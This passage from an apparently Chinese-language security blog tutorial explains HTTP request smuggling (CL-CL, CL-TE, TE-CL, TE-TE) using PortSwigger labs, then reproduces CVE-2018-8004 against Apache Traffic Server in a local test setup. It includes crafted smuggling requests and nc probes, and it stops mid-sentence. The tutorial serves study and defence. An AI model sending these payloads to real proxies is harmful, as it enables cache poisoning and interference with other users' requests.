CL-CL"></a>3.2 CL-CL</h3><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p></blockquote><p>但是总有服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。</p><p>此时恶意攻击者可以构造一个特殊的请求</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器，而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。此时恰巧有一个其他的正常用户对服务器进行了请求，假设请求如图所示。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>从前面我们也知道了，代理服务器与源站服务器之间一般会重用TCP连接。</p><p>这时候正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aGET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: example.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>这时候用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且后续可以扩展成类似于CSRF的攻击方式。</p><p>但是两个<code>Content-Length</code>这种请求包还是太过于理想化了，一般的服务器都不会接受这种存在两个请求头的请求包。但是在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这其实也就意味着请求包中同时包含这两个请求头并不算违规，服务器也不需要返回<code>400</code>错误。服务器在这里的实现更容易出问题。</p><blockquote><p><a href="https://tools.ietf.org/html/rfc2616#section-4.4">https://tools.ietf.org/html/rfc2616#section-4.4</a></p></blockquote><h3 id="3-3-CL-TE"><a href="#3-3-CL-TE" class="headerlink" title="3.3 CL-TE"></a>3.3 CL-TE</h3><p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p><p>chunk传输数据格式如下，其中size的值由16进制表示。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="hljs-number">0</span>][\r\n][\r\n]<br></code></pre></td></tr></table></figure><p>Lab 地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>构造数据包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Cookie: session=E9m1pnYfbvtMyEnTYSe5eijPDC04EVm3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>G<br></code></pre></td></tr></table></figure><p>连续发送几次请求就可以获得该响应。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191009002040605.png" alt="image-20191009002040605"></p><p>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>G<br></code></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>服务器在解析时当然会产生报错了。</p><h3 id="3-4-TE-CL"><a href="#3-4-TE-CL" class="headerlink" title="3.4 TE-CL"></a>3.4 TE-CL</h3><p>所谓<code>TE-CL</code>，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>这一请求头，而后端服务器处理<code>Content-Length</code>请求头。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>构造数据包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: acf41f441edb9dc9806dca7b00000035.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Cookie: session=3Eyiu83ZSygjzgAfyGPn8VdGbKw5ifew<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191009095101287.png" alt="image-20191009095101287"></p><p>由于前端服务器处理<code>Transfer-Encoding</code>，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错。</p><h3 id="3-5-TE-TE"><a href="#3-5-TE-TE" class="headerlink" title="3.5 TE-TE"></a>3.5 TE-TE</h3><p><code>TE-TE</code>，也很容易理解，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，这确实是实现了RFC的标准。不过前后端服务器毕竟不是同一种，这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。从某种意义上还是<code>CL-TE</code>或者<code>TE-CL</code>。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>构造数据包</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: ac4b1fcb1f596028803b11a2007400e4.web-security-academy.net<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Accept-Language: en-US,en;q=0.5<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Cookie: session=Mew4QW7BRxkhk0p1Thny2GiXiZwZdMd8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>GPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191009111046828.png" alt="image-20191009111046828"></p><h2 id="4-HTTP走私攻击实例——CVE-2018-8004"><a href="#4-HTTP走私攻击实例——CVE-2018-8004" class="headerlink" title="4. HTTP走私攻击实例——CVE-2018-8004"></a>4. HTTP走私攻击实例——CVE-2018-8004</h2><h3 id="4-1-漏洞概述"><a href="#4-1-漏洞概述" class="headerlink" title="4.1 漏洞概述"></a>4.1 漏洞概述</h3><p>Apache Traffic Server（ATS）是美国阿帕奇（Apache）软件基金会的一款高效、可扩展的HTTP代理和缓存服务器。 </p><p>Apache ATS 6.0.0版本至6.2.2版本和7.0.0版本至7.1.3版本中存在安全漏洞。攻击者可利用该漏洞实施HTTP请求走私攻击或造成缓存中毒。</p><p>在美国国家信息安全漏洞库中，我们可以找到关于该漏洞的四个补丁，接下来我们详细看一下。</p><p>CVE-2018-8004 补丁列表<br><a href="https://github.com/apache/trafficserver/pull/3192">https://github.com/apache/trafficserver/pull/3192</a><br><a href="https://github.com/apache/trafficserver/pull/3201">https://github.com/apache/trafficserver/pull/3201</a><br><a href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a><br><a href="https://github.com/apache/trafficserver/pull/3251">https://github.com/apache/trafficserver/pull/3251</a></p><p>注：虽然漏洞通告中描述该漏洞影响范围到7.1.3版本，但从github上补丁归档的版本中看，在7.1.3版本中已经修复了大部分的漏洞。</p><h3 id="4-2-测试环境"><a href="#4-2-测试环境" class="headerlink" title="4.2 测试环境"></a>4.2 测试环境</h3><h4 id="4-2-1-简介"><a href="#4-2-1-简介" class="headerlink" title="4.2.1 简介"></a>4.2.1 简介</h4><p>在这里，我们以ATS 7.1.2为例，搭建一个简单的测试环境。</p><p>环境组件介绍</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">反向代理服务器<br><span class="hljs-symbol">IP:</span> <span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.22</span>:<span class="hljs-number">80</span><br>Ubuntu <span class="hljs-number">16.04</span><br>Apache Traffic Server <span class="hljs-number">7.1</span><span class="hljs-number">.2</span><br><br>后端服务器<span class="hljs-number">1</span>-LAMP<br><span class="hljs-symbol">IP:</span> <span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span>:<span class="hljs-number">10085</span><br>Apache HTTP Server <span class="hljs-number">2.4</span><span class="hljs-number">.7</span><br>PHP <span class="hljs-number">5.5</span><span class="hljs-number">.9</span><br><br>后端服务器<span class="hljs-number">2</span>-LNMP<br><span class="hljs-symbol">IP:</span> <span class="hljs-number">10.211</span><span class="hljs-number">.55</span><span class="hljs-number">.2</span>:<span class="hljs-number">10086</span><br>Nginx <span class="hljs-number">1.4</span><span class="hljs-number">.6</span><br>PHP <span class="hljs-number">5.5</span><span class="hljs-number">.9</span><br></code></pre></td></tr></table></figure><p>环境拓扑图</p><p><img src="https://image.mengsec.com/request-smugging/ats-topology.png" alt="ats-topology"></p><p>Apache Traffic Server 一般用作HTTP代理和缓存服务器，在这个测试环境中，我将其运行在了本地的Ubuntu虚拟机中，把它配置为后端服务器LAMP&amp;LNMP的反向代理，然后修改本机HOST文件，将域名<code>ats.mengsec.com</code>和<code>lnmp.mengsec,com</code>解析到这个IP，然后在ATS上配置映射，最终实现的效果就是，我们在本机访问域名<code>ats.mengsec.com</code>通过中间的代理服务器，获得LAMP的响应，在本机访问域名<code>lnmp.mengsec,com</code>，获得LNMP的响应。</p><p>为了方便查看请求的数据包，我在LNMP和LAMP的Web目录下都放置了输出请求头的脚本。</p><p>LNMP: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This is Nginx&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">&#x27;getallheaders&#x27;</span>)) &#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getallheaders</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$name</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;HTTP_&#x27;</span>) &#123;<br>                <span class="hljs-variable">$headers</span>[str_replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, ucwords(strtolower(str_replace(<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, substr(<span class="hljs-variable">$name</span>, <span class="hljs-number">5</span>)))))] = <span class="hljs-variable">$value</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>    &#125;<br><br>&#125;<br>var_dump(getallheaders());<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>print_r(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>LAMP:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;This is LAMP:80&lt;br&gt;&#x27;</span>;<br>var_dump(getallheaders());<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>print_r(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><h4 id="4-2-2-搭建过程"><a href="#4-2-2-搭建过程" class="headerlink" title="4.2.2 搭建过程"></a>4.2.2 搭建过程</h4><p>在GIthub上下载源码编译安装ATS。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>trafficserver<span class="hljs-regexp">/archive/</span><span class="hljs-number">7.1</span>.<span class="hljs-number">2</span>.tar.gz<br></code></pre></td></tr></table></figure><p>安装依赖&amp;常用工具。</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install -y autoconf automake libtool pkg-config libmodule-install-perl gcc libssl-<span class="hljs-built_in">dev</span> libpcre3-<span class="hljs-built_in">dev</span> libcap-<span class="hljs-built_in">dev</span> libhwloc-<span class="hljs-built_in">dev</span> libncurses5-<span class="hljs-built_in">dev</span> libcurl4-openssl-<span class="hljs-built_in">dev</span> flex tcl-<span class="hljs-built_in">dev</span> net-tools vim curl wget<br></code></pre></td></tr></table></figure><p>然后解压源码，进行编译&amp;安装。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">autoreconf -<span class="hljs-keyword">if</span><br>./configure --prefix=/<span class="hljs-keyword">opt</span>/<span class="hljs-keyword">ts</span>-<span class="hljs-number">712</span><br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure><p>安装完毕后，配置反向代理和映射。</p><p>编辑<code>records.config</code>配置文件，在这里暂时把ATS的缓存功能关闭。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">vim</span> /opt/ts-<span class="hljs-number">712</span>/etc/trafficserver/records.config<br><br><span class="hljs-attribute">CONFIG</span> proxy.config.http.cache.http INT <span class="hljs-number">0</span> # 关闭缓存<br><span class="hljs-attribute">CONFIG</span> proxy.config.reverse_proxy.enabled INT <span class="hljs-number">1</span> # 启用反向代理<br><span class="hljs-attribute">CONFIG</span> proxy.config.url_remap.remap_required INT <span class="hljs-number">1</span> # 限制ats仅能访问map表中映射的地址<br><span class="hljs-attribute">CONFIG</span> proxy.config.http.server_ports STRING <span class="hljs-number">80</span> <span class="hljs-number">80</span>:ipv<span class="hljs-number">6</span> # 监听在本地<span class="hljs-number">80</span>端口<br></code></pre></td></tr></table></figure><p>编辑<code>remap.config</code>配置文件，在末尾添加要映射的规则表。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/opt/</span>ts-<span class="hljs-number">712</span><span class="hljs-regexp">/etc/</span>trafficserver/remap.config<br><br>map http:<span class="hljs-regexp">//</span>lnmp.mengsec.com<span class="hljs-regexp">/ http:/</span><span class="hljs-regexp">/10.211.55.2:10086/</span><br>map http:<span class="hljs-regexp">//</span>ats.mengsec.com<span class="hljs-regexp">/ http:/</span><span class="hljs-regexp">/10.211.55.2:10085/</span><br></code></pre></td></tr></table></figure><p>配置完毕后重启一下服务器使配置生效，我们可以正常访问来测试一下。</p><p>为了准确获得服务器的响应，我们使用管道符和<code>nc</code>来与服务器建立链接。</p><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zsh"><span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\<br><span class="hljs-string">&#x27;Host:ats.mengsec.com\r\n&#x27;</span>\<br><span class="hljs-string">&#x27;\r\n&#x27;</span>\<br>| nc 10.211.55.22 80<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191007225109915.png" alt="image-20191007225109915"></p><p>可以看到我们成功的访问到了后端的LAMP服务器。</p><p>同样的可以测试，代理服务器与后端LNMP服务器的连通性。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">printf &#x27;GET / HTTP/1.1\r\n&#x27;\<br>&#x27;Host:lnmp.mengsec.com\r\n&#x27;\<br>&#x27;\r\n&#x27;\<br>| nc 10.211.55.22 80<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191007225230629.png" alt="image-20191007225230629"></p><h3 id="4-3-漏洞测试"><a href="#4-3-漏洞测试" class="headerlink" title="4.3 漏洞测试"></a>4.3 漏洞测试</h3><p>来看下四个补丁以及它的描述</p><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3192">https://github.com/apache/trafficserver/pull/3192</a> # 3192 如果字段名称后面和冒号前面有空格，则返回400<br><a href="https://github.com/apache/trafficserver/pull/3201">https://github.com/apache/trafficserver/pull/3201</a> # 3201 当返回400错误时，关闭链接<br><a href="https://github.com/apache/trafficserver/pull/3231">https://github.com/apache/trafficserver/pull/3231</a> # 3231 验证请求中的Content-Length头<br><a href="https://github.com/apache/trafficserver/pull/3251">https://github.com/apache/trafficserver/pull/3251</a> # 3251 当缓存命中时，清空请求体</p></blockquote><h4 id="4-3-1-第一个补丁"><a href="#4-3-1-第一个补丁" class="headerlink" title="4.3.1 第一个补丁"></a>4.3.1 第一个补丁</h4><blockquote><p><a href="https://github.com/apache/trafficserver/pull/3192">https://github.com/apache/trafficserver/pull/3192</a> # 3192 如果字段名称后面和冒号前面有空格，则返回400</p></blockquote><p>看介绍是给ATS增加了<code>RFC7230</code>第<code>3.2.4</code>章的实现，</p><blockquote><p><a href="https://tools.ietf.org/html/rfc7230#section-3.2.4">https://tools.ietf.org/html/rfc7230#section-3.2.4</a></p></blockquote><p>在其中，规定了HTTP的请求包中，请求头字段与后续的冒号之间不能有空白字符，如果存在空白字符的话，服务器必须返回<code>400</code>，从补丁中来看的话，在ATS 7.1.2中，并没有对该标准进行一个详细的实现。当ATS服务器接收到的请求中存在请求字段与<code>:</code>之间存在空格的字段时，并不会对其进行修改，也不会按照RFC标准所描述的那样返回<code>400</code>错误，而是直接将其转发给后端服务器。</p><p>而当后端服务器也没有对该标准进行严格的实现时，就有可能导致HTTP走私攻击。比如Nginx服务器，在收到请求头字段与冒号之间存在空格的请求时，会忽略该请求头，而不是返回<code>400</code>错误。</p><p>在这时，我们可以构造一个特殊的HTTP请求，进行走私。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: lnmp.mengsec.com<br><span class="hljs-attribute">Content</span>-Length : <span class="hljs-number">56</span><br><br><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: lnmp.mengsec.com<br><span class="hljs-attribute">attack</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">foo</span>: <br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/request-smugging/image-20191008113819748.png" alt="image-20191008113819748"></p><p>很明显，请求包中下面的数据部分在传输过程中被后端服务器解析成了请求头。</p><p>来看下Wireshark中的数据包，ATS在与后端Nginx服务器进行数据传输的过程中，重用了TCP连接。</p><p><img src="https://image.mengsec.com/request-smugging/image-20191008114247036.png" alt="image-20191008114247036"></p><p>只看一下请求，如图所示：</p><p><img src="https://image.mengsec.com/request-smugging/image-20191008114411337.png" alt="image-20191008114411337"></p><p>阴影部分为第一个请求，剩下的部分为第二个请求。</p><p>在我们发送的请求中，存在特殊构造的请求头<code>Content-Length : 56</code>，56就是后续数据的长度。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: lnmp.mengsec.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>attack: 1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>foo: <br></code></pre></td></tr></table></figure><p>在数据的末尾，不存在<code>\r\n</code>这个结尾。</p><p>当我们的请求到达ATS服务器时，因为ATS服务器可以解析<code>Content-Length : 